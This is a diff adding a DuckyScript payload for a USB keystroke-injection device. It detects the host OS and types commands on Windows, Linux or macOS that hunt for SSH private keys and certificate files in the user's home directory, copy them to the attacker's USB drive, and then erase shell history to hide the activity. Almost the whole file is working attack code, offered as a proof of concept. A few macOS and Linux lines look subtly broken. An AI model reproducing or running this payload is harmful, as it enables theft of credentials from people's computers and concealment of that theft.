@@ -1,0 +1,374 @@
+REM_BLOCK
+####################################################################
+#                                                                  #
+# Title        : SSH Key And Cert Exfiltration Cross-Platform PoC  #
+# Author       : sib002 - aleff-github                             #
+# Version      : 1.0                                               #
+# Category     : Exfiltration                                      #
+# Target       : GNU/linux - Windows - MacOS                       #
+# Target Tested: Ubuntu 26.04 - Windows 11 - MacOS Big Sur 11.7.10 #
+#                                                                  #
+####################################################################
+END_REM
+
+REM Here you must indicate the name of the device you want to use to complete the data exfiltration. For example, a USB Rubber Ducky could be suitable: DUCK
+DEFINE #FileSystemLabel example
+
+REM Generally, 10 kb is sufficient for a certificate, but sometimes it may not be enough. If you know that your file exceeds this size and you still want to be able to store it, then you just need to change this reference.
+
+REM For example in find command for 10 kb you should write: 10k
+DEFINE #SizeOfOtherFilesInFind example
+
+REM While for the Windows length command you can use the full number directly, for example for 10 kb you should enter: 10240
+DEFINE #SizeOfOtherFilesInLength example
+
+EXTENSION OS_DETECTION
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USB Rubber Ducky Host OS Detection
+        Generic OS detection at a high view is a moving target
+        results may vary greatly depending
+        on a combination of many variables:
+         - number of testing stages
+         - specific devices and versions tested against
+         - number of systems testing for (scope)
+         - detection techniques (passive/invisible/active/hybrid)
+         - overall speed
+         - overall accuracy
+
+        If all you require is windows vs <anything other os> detection, the
+        PASSIVE_WINDOWS_DETECT extension is recommended over this extension.
+
+        TARGET:
+            DEFAULT - Windows, Mac, Linux
+            ADVANCED_DETECTION - Windows, Mac, Linux, iOS, ChromeOS, Android
+
+        USAGE:
+            Uncomment the function call below to run this extension inline (here)
+            or call DETECT_OS() anywhere in your payload after the extension
+            Place this extension and the DETECT_OS() before
+            you would like to first reference $_OS to execute payload code conditionally
+
+        FEEDBACK:
+            As mentioned above, this a moving target (especially for mac systems)
+            Please report any issues identifying specific operating systems.
+            Your feedback will greatly help solidify the robustness of this extension
+
+        DEBUGGING:
+            SET DEBUGGING_OUTPUT DEFINE to TRUE, deploy on a target with text editor open for debug output
+    END_REM
+
+    REM CONFIGURATION:
+    REM For Debugging:
+    DEFINE #DEBUGGING_OUTPUT FALSE
+    DEFINE #ADVANCED_DETECTION FALSE
+    REM Timing fine tuning:
+    DEFINE #STARTUP_DELAY 1500
+    DEFINE #RESTART_WAIT 1000
+    DEFINE #CONNECT_WAIT 1000
+    DEFINE #OS_DETECT_MODE HID
+    DEFINE #OS_DETECT_VID VID_05AC
+    DEFINE #OS_DETECT_PID PID_021E
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #HOST_RESPONSE_TIMEOUT 1000
+
+    FUNCTION DETECT_OS()
+        $_HOST_CONFIGURATION_REQUEST_COUNT = 0
+        ATTACKMODE #OS_DETECT_MODE #OS_DETECT_VID #OS_DETECT_PID
+        DELAY #STARTUP_DELAY
+        SAVE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            IF_DEFINED_TRUE #ADVANCED_DETECTION
+                STRING ADVANCED OS DETECT
+            ELSE_DEFINED
+                STRING OS DETECT
+            END_IF_DEFINED
+
+            ENTER
+            STRING test caps
+        END_IF_DEFINED
+
+        IF ($_CAPSLOCK_ON == FALSE) THEN
+            LED_R
+            CAPSLOCK
+            DELAY #HOST_RESPONSE_TIMEOUT
+        END_IF
+        LED_OFF
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            ENTER
+            STRING test done
+        END_IF_DEFINED
+
+        IF $_RECEIVED_HOST_LOCK_LED_REPLY THEN
+            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                ENTER
+                STRING received led response
+            END_IF_DEFINED
+            LED_G
+            IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING prediction: Windows
+                END_IF_DEFINED
+                $_OS = WINDOWS
+            ELSE
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING prediction: Linux
+                END_IF_DEFINED
+                $_OS = LINUX
+            END_IF
+        ELSE
+            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                ENTER
+                STRING no led response
+                ENTER
+                STRING prediciton: MacOS
+            END_IF_DEFINED
+            $_OS = MACOS
+        END_IF
+
+        IF_DEFINED_TRUE #ADVANCED_DETECTION
+            IF ( $_OS == LINUX ) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING soft reconnect
+                END_IF_DEFINED
+                ATTACKMODE OFF
+                DELAY #RESTART_WAIT
+                ATTACKMODE #OS_DETECT_MODE #OS_DETECT_VID #OS_DETECT_PID
+                DELAY #CONNECT_WAIT
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING reconnected
+                END_IF_DEFINED
+                IF ($_CAPSLOCK_ON == TRUE) THEN
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING caps led on
+                        ENTER
+                        STRING test numlock
+                    END_IF_DEFINED
+                    NUMLOCK
+                    DELAY #HOST_RESPONSE_TIMEOUT
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING test done
+                    END_IF_DEFINED
+                    IF ($_NUMLOCK_ON == FALSE) THEN
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING no numlock led
+                            ENTER
+                            STRING prediciton: ChromeOS
+                        END_IF_DEFINED
+                        $_OS = CHROMEOS
+                    ELSE
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING numlock led on
+                            ENTER
+                            STRING testing scrolllock
+                        END_IF_DEFINED
+                        SCROLLLOCK
+                        DELAY #HOST_RESPONSE_TIMEOUT
+                        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                            ENTER
+                            STRING test done
+                        END_IF_DEFINED
+                        IF ($_SCROLLLOCK_ON == TRUE) THEN
+                            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                                ENTER
+                                STRING scrolllock led on
+                                ENTER
+                                STRING prediciton: Android
+                            END_IF_DEFINED
+                            $_OS = ANDROID
+                        ELSE
+                            IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                                ENTER
+                                STRING no scrolllock reply
+                                ENTER
+                                STRING prediction: Linux
+                            END_IF_DEFINED
+                            $_OS = LINUX
+                        END_IF
+                    END_IF
+                END_IF
+            ELSE IF ($_OS == MACOS) THEN
+                IF ($_CAPSLOCK_ON == TRUE) THEN
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING caps led on
+                        ENTER
+                        STRING prediction: iOS
+                    END_IF_DEFINED
+                    $_OS = IOS
+                ELSE 
+                    IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                        ENTER
+                        STRING no caps reply
+                        ENTER
+                        STRING prediction: MacOS
+                    END_IF_DEFINED
+                    $_OS = MACOS
+                END_IF
+            ELSE IF ($_OS == WINDOWS) THEN
+                IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+                    ENTER
+                    STRING Confident Windows Prediction
+                END_IF_DEFINED
+                $_OS = WINDOWS
+            END_IF
+        END_IF_DEFINED
+
+        RESTORE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED_TRUE #DEBUGGING_OUTPUT
+            ENTER
+            STRING OS_DETECT complete
+            ENTER
+        END_IF_DEFINED
+    END_FUNCTION
+
+    REM Uncomment the function call below to run this extension inline (here)
+    REM or call DETECT_OS() anywhere in your payload after the extension
+    REM DETECT_OS()
+END_EXTENSION
+
+DETECT_OS()
+
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 1000
+    STRINGLN powershell
+    DELAY 1300
+    
+    STRING
+        $m=(Get-Volume -FileSystemLabel '#FileSystemLabel').DriveLetter;
+        mkdir "${m}:\keys";  
+        $DONE = 0;
+        if(Test-Path $env:USERPROFILE\.ssh\id_rsa*) {
+            Copy-Item $env:USERPROFILE\.ssh\id_rsa* ${m}:\keys; 
+            $DONE = 1;
+        }
+        if ($DONE -ne 1) {
+            $SEARCH_FOR_KEYS=(Get-ChildItem $env:USERPROFILE -recurse -erroraction silentlycontinue | Where-Object {$_.Length -lt #SizeOfOtherFilesInLength -and (($_ | Select-String "OPENSSH PRIVATE KEY") -or ($_.name -like "id_rsa*"))});
+            if ( $SEARCH_FOR_KEYS.Count -gt 0){
+                foreach($path in $SEARCH_FOR_KEYS){
+                    Copy-Item $path ${m}:\keys;
+                    }
+                $DONE = 1;
+            }
+        }
+        if ($DONE -ne 1) {
+            $SEARCH_FOR_KEYS=(Get-ChildItem $env:USERPROFILE -recurse -erroraction silentlycontinue -depth 3 | where-object {$_.length -lt #SizeOfOtherFilesInLength -and ($_.extension.tolower() -in @( ".pem", ".key", ".rsa", ".crt", ".cer" , ".der", ".pfx", ".p12"))});
+            if ( $SEARCH_FOR_KEYS.Count -gt 0){
+                foreach ( $path in $SEARCH_FOR_KEYS){
+                    if( $path.extension.tolower() -eq ".crt"){
+                        Copy-Item $path\..\* "${m}:\keys";}
+                    else{
+                        Copy-Item $path "${m}:\keys"; 
+                    }
+                }
+                $DONE = 1;
+            }
+        }
+        $HISTORY = Get-Content (Get-PSReadLineOption).HistorySavePath;
+        $HISTORY = $HISTORY[0..($HISTORY.Length - 2)];
+        $HISTORY | Set-Content (Get-PSReadLineOption).HistorySavePath; exit
+    END_STRING
+    DELAY 500
+    ENTER
+
+ELSE IF ($_OS == LINUX) THEN
+    CTRL-ALT t
+    DELAY 1300
+    STRING
+    	DUCKY_LABEL=$(lsblk -nr -o NAME,LABEL | grep -i "#FileSystemLabel" | awk '{print $1}');
+    	MOUNT_OUTPUT=$(udisksctl mount -b "/dev/$DUCKY_LABEL" 2>/dev/null);
+    	MOUNT_POINT=$(echo $MOUNT_OUTPUT | awk -v IGNORECASE=1 -F ' at ' '/mounted/ {print $2}');
+    	DEST_PATH="$MOUNT_POINT/keys/";
+    	mkdir -p "$DEST_PATH";
+    	DONE=0;
+    	if [ -e "$HOME/.ssh/id_rsa" ]; 
+    		then cp $HOME/.ssh/id_rsa* "$DEST_PATH";
+    		DONE=1;
+    	fi;
+    	if [ "$DONE" != "1" ]; 
+    	then SEARCH_PATH=$(find "$HOME" \( -type f -size -#SizeOfOtherFilesInFind -exec grep -qi "OPENSSH PRIVATE KEY" {} ; -print \) -o \( -type f -size -#SizeOfOtherFilesInFindk -name "id_rsa*" \));
+    		if [ -n "$SEARCH_PATH" ]; 
+    			then while IFS= read -r file; 
+    			do cp "$file" "$DEST_PATH";
+    			DONE=1;
+    			done <<< "$SEARCH_PATH";
+    		fi;
+    	fi;
+    	if [ "$DONE" != "1" ]; 
+    		then find "$HOME" -maxdepth 3 -type f -size -#SizeOfOtherFilesInFind \( -iname "*.pem" -o -iname "*.key" -o -iname "*.rsa" -o -iname "*.crt" 
+    			-o -iname "*.cer" -o -iname "*.der" -o -iname "*.pfx" -o -iname "*.p12" \) 2>/dev/null | 
+    		while IFS= read -r f; 
+    		do if [[ "$f" == *.crt ]]; 
+    			then cp -r "$(dirname "$f")" "$DEST_PATH";
+    			else cp "$f" "$DEST_PATH"; 
+    			fi;
+    		done;
+    	fi;
+    	udisksctl unmount -b "$DUCKY_LABEL" > /dev/null 2>&1;
+    	udisksctl power-off -b "$DUCKY_LABEL" > /dev/null 2>&1;
+    	history -c;
+    	exit
+    END_STRING
+    DELAY 500
+    ENTER
+
+ELSE IF ($_OS == MACOS) THEN
+    GUI SPACE
+    DELAY 1000
+    STRINGLN Terminal
+    DELAY 1000
+
+    STRING
+        DUCKY_DEV=$(diskutil list | awk 'toupper($0) ~ /#FileSystemLabel/ {print $NF; exit}');
+        MOUNT_OUTPUT=$(diskutil mount "$DUCKY_DEV" 2>/dev/null);
+        MOUNT_POINT=$(echo "$DUCKY_OUTPUT" | awk -F' at ' '/mounted at/ {print $2}');
+        DEST_PATH="$MOUNT_POINT/keys/";
+        mkdir -p "$DEST_PATH";
+        DONE=0;
+
+        if [ -e "~/.ssh/id_rsa" ]; then
+            cp ~/.ssh/id_rsa* "$DEST_PATH";
+            DONE=1;
+        fi;
+
+        if [ "$DONE" != "1" ]; then
+            SEARCH_PATH=$(find ~ -type f -size -#SizeOfOtherFilesInFind \( -name 'id_rsa*' -o -exec grep -qi 'OPENSSH PRIVATE KEY' {} \; \) -print 2>/dev/null);
+            if [ -n "SEARCH_PATH" ]; then
+                DONE=1;
+                while IFS= read -r file; do
+                    [ -n "$file" ] && cp "$file" "$DEST_PATH";
+                done <<< "$SEARCH_PATH";
+            fi;
+        fi;
+
+        if [ "$DONE" != "1" ]; then
+            find ~ -maxdepth 3 -type f -size -#SizeOfOtherFilesInFind \( -iname "*.pem" -o -iname "*.key" -o -iname "*.rsa" -o -iname "*.cer" -o -iname "*.der" -o -iname "*.pfx" -o -iname "*.p12" \) 2>/dev/null |;
+            while IFS= read -r f; do
+                if [[ "$f" == *.crt ]]; then
+                    cp -r "$(dirname "$f")" "$DEST_PATH";
+                else
+                    cp "$f" "$DEST_PATH";
+                fi;
+            done;
+        fi;
+
+        rm -rf ~/.zsh_sessions/;
+        killall Terminal
+    END_STRING
+    DELAY 500
+    ENTER
+END_IF
